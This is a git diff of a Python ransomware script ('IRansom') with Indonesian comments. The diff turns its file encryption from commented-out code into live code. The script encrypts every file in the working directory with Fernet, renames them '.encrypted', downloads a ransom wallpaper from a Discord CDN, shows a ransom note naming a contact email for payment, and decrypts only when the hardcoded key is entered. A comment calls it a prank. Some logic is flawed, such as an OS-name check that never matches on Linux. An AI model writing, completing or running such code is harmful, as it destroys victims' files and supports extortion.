@@ -5,23 +5,48 @@ from tkinter import messagebox
 import time
 from cryptography.fernet import Fernet
 import os
-import ctypes
 import urllib.request
 import requests
+import platform
 
 
-def change_wallpaper():
-    imageUrl = 'https://cdn.discordapp.com/attachments/1015813895740469249/1073782195279376494/20230211_084541_0000.png'
-    r = requests.get(imageUrl)
-    name = "IRansom_wallpaper.png"
-    file = open(name, "wb")
-    file.write(r.content)
-    file.close()
-    PATH = os.path.abspath(name)
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)
+imageUrl = 'https://cdn.discordapp.com/attachments/1134468557858672794/1134713512644587630/Ooops_your_files.png'
+r = requests.get(imageUrl)
+name = "IRansom_wallpaper.png"
+file = open(name, "wb")
+file.write(r.content)
+file.close()
+path = os.path.abspath(name)
 
 
-change_wallpaper()
+def change_wallpaper(image_path):
+
+    system = platform.system()
+
+    if system == "Windows":
+        import ctypes
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+
+    elif system == 'Darwin':
+        script = f"""
+        tell application "System Events"
+            set desktop picture to POSIX file "{image_path}"
+        end tell
+        """
+        os.system(f"osascript -e '{script}'")
+
+    elif system == 'Linux':
+        os.system(
+            f"gsettings set org.gnome.desktop.background picture-uri file://{image_path}")
+
+    else:
+        print(f"Sistem operasi '{system}' tidak didukung.")
+
+
+if __name__ == "__main__":
+    # Ganti "path_ke_gambar_anda" dengan path lengkap ke gambar yang ingin Anda gunakan sebagai wallpaper.
+    wallpaper_path = path
+    change_wallpaper(wallpaper_path)
 
 
 def ransom_note():
@@ -64,11 +89,9 @@ There is no other way but to recover your files with a special key,
 Only we can decrypt your files! To pay and recover your files, 
 ==================================================================
 please follow these steps:
-
 1. Contact hcrcode@protonmail.com email to pay and decrypt your files.
 2.If you have already paid, send proof of payment to the email.
 3. You will be given a text file containing the key to recover your file
-
 Good luck!
 Regards :
 R.Code
@@ -83,27 +106,29 @@ ransom_note()
 # TINGGAL DI UNCOMMENT AJA, TPI SEGALA RESIKO NYA SAYA GAK TANGGUNG JAWAB, KARNA INI TUJUAN NYA BUAT UJI COBA + NGEPRANK AJA
 # =========================================================================================================================
 
-# files = []
+files = []
 
-# for file in os.listdir():
-#     if file == "main.py" or file == "encrypt.key":
-#         continue
-#     if os.path.isfile(file):
-#         files.append(file)
+for file in os.listdir():
+    if file == "main.py" or file == "encrypt.key" or file == "IRansom_Note.txt":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
 
-# print(files)
+print(files)
 
-# key = Fernet.generate_key()
+key = Fernet.generate_key()
 
-# with open('encrypt.key', 'wb') as thekey:
-#     thekey.write(key)
+with open('encrypt.key', 'wb') as thekey:
+    thekey.write(key)
 
-# for file in files:
-#     with open(file, "rb") as thefile:
-#         contents = thefile.read()
-#     encrypted_content = Fernet(key).encrypt(contents)
-#     with open(file, 'wb') as thefile:
-#         thefile.write(encrypted_content)
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    encrypted_content = Fernet(key).encrypt(contents)
+    with open(file, 'wb') as thefile:
+        thefile.write(encrypted_content)
+
+    os.rename(file, file + ".encrypted")
 
 
 app = tk.Tk()
@@ -118,7 +143,6 @@ main_font = tk.font.Font(family="Lucida Sans Typewriter",
                          weight="bold")
 
 text = """
-
                      ...::...                     
             ..   .:::^^^^^^^^:::.   ..            
           !PJ  .::.::....: ..^:.:^.  J5~          
@@ -193,44 +217,104 @@ key_input.pack(pady=10, ipady=3)
 def check_key():
 
     if key_input.get() == "ISCIRansomware":
-        
-        def change_back_wallpaper():
-            imageUrl = 'https://cdn.discordapp.com/attachments/1066151837151002624/1073982697669668975/th-1340296826.jpeg'
-            r = requests.get(imageUrl)
-            name = "wallpaper.jpeg"
-            file = open(name, "wb")
-            file.write(r.content)
-            file.close()
-            PATH = os.path.abspath(name)
-            ctypes.windll.user32.SystemParametersInfoW(20, 0, PATH, 3)
-
-
-        change_back_wallpaper()
-
-        # CODE UNTUK DECRYPT FILE YANG SUDAH DI ENCRYPT
-
-        # files = []
-
-        # for file in os.listdir():
-        #     if file == 'main.py' or file == 'encrypt.key':
-        #         continue
-        #     if os.path.isfile(file):
-        #         files.append(file)
-
-        # with open("encrypt.key", "rb") as key:
-        #     decryptkey = key.read()
-
-        # for file in files:
-        #     with open(file, "rb") as thefile:
-        #         contents = thefile.read()
-        #     decrypted_content = Fernet(decryptkey).decrypt(contents)
-
-        #     with open(file, 'wb') as thefile:
-        #         thefile.write(decrypted_content)
-
         messagebox.showinfo(
             "Success", "Your key is valid\nplase wait for your file decryption process")
 
+        system = platform.system()
+
+        if system == "Windows":
+            imageUrl = 'https://cdn.discordapp.com/attachments/1015813895740469249/1134714461110931496/th-1340296826.jpeg'
+            r = requests.get(imageUrl)
+            name = "windows.jpeg"
+            file = open(name, "wb")
+            file.write(r.content)
+            file.close()
+            changeWallpaperBack = os.path.abspath(name)
+
+        elif system == "Darwin":
+            imageUrl = 'https://cdn.discordapp.com/attachments/1015813895740469249/1074138167130718269/th-1917587008.jpeg'
+            r = requests.get(imageUrl)
+            name = "darwin.jpeg"
+            file = open(name, "wb")
+            file.write(r.content)
+            file.close()
+            changeWallpaperBack = os.path.abspath(name)
+
+        elif system == "linux":
+            imageUrl = 'https://cdn.discordapp.com/attachments/1015813895740469249/1074136346920239176/th-2786707639.jpeg'
+            r = requests.get(imageUrl)
+            name = "ubuntu.jpeg"
+            file = open(name, "wb")
+            file.write(r.content)
+            file.close()
+            changeWallpaperBack = os.path.abspath(name)
+
+        else:
+            imageUrl = 'https://cdn.discordapp.com/attachments/1033630887352467506/1034121949875548230/isci-wallpaper.png'
+            r = requests.get(imageUrl)
+            name = "isci.png"
+            file = open(name, "wb")
+            file.write(r.content)
+            file.close()
+            changeWallpaperBack = os.path.abspath(name)
+
+        def change_back_wallpaper(image_change_back_wallpaper):
+            system = platform.system()
+
+            if system == 'Windows':
+
+                # Windows
+                # Memanggil fungsi dari 'ctypes' seperti yang sudah dijelaskan pada jawaban sebelumnya.
+                import ctypes
+                SPI_SETDESKWALLPAPER = 20
+                ctypes.windll.user32.SystemParametersInfoW(
+                    SPI_SETDESKWALLPAPER, 0, image_change_back_wallpaper, 3)
+
+            elif system == 'Darwin':
+                # macOS
+                # Menggunakan AppleScript untuk mengganti wallpaper pada macOS.
+                script = f"""
+                tell application "System Events"
+                    set desktop picture to POSIX file "{image_change_back_wallpaper}"
+                end tell
+                """
+                os.system(f"osascript -e '{script}'")
+
+            elif system == 'Linux':
+                # Linux
+                # Menggunakan perintah 'gsettings' untuk mengganti wallpaper pada desktop GNOME.
+                os.system(
+                    f"gsettings set org.gnome.desktop.background picture-uri file://{image_change_back_wallpaper}")
+
+            else:
+                print(f"Sistem operasi '{system}' tidak didukung.")
+
+        if __name__ == "__main__":
+            # Ganti "path_ke_gambar_anda" dengan path lengkap ke gambar yang ingin Anda gunakan sebagai wallpaper.
+            wallpaper_path = changeWallpaperBack
+            change_back_wallpaper(wallpaper_path)
+
+        # CODE UNTUK DECRYPT FILE YANG SUDAH DI ENCRYPT
+
+        files = []
+
+        for file in os.listdir():
+            if file == 'main.py' or file == 'encrypt.key' or file == 'main2.py':
+                continue
+            if os.path.isfile(file):
+                files.append(file)
+
+        with open("encrypt.key", "rb") as key:
+            decryptkey = key.read()
+
+        for file in files:
+            with open(file, "rb") as thefile:
+                contents = thefile.read()
+            decrypted_content = Fernet(decryptkey).decrypt(contents)
+
+            with open(file, 'wb') as thefile:
+                thefile.write(decrypted_content)
+            os.rename(file, file.replace(".encrypted", ""))
 
         app.destroy()
 
